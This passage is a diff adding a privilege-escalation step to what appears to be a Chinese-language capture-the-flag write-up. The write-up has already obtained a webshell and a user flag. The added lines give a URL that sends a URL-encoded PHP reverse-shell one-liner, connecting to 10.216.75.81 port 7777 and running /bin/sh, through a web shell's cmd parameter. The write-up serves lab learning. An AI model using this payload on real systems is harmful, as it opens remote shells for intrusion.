@@ -256,3 +256,8 @@ page的内容随便写什么，只要里面用了`[[shell]]`(这里shell是因�
 然后就拿到webshell了。
 ![](file-20260510002936514.png)
 `flag{user-548b5242171e085fc64be9252a132ad5}`
+# 提权
+这里用php弹一个shell过来
+```http
+http://baker.dsz/pages/test.php?cmd=php%20-r%20%27%24sock%3Dfsockopen(%2210.216.75.81%22%2C7777)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B%27
+```
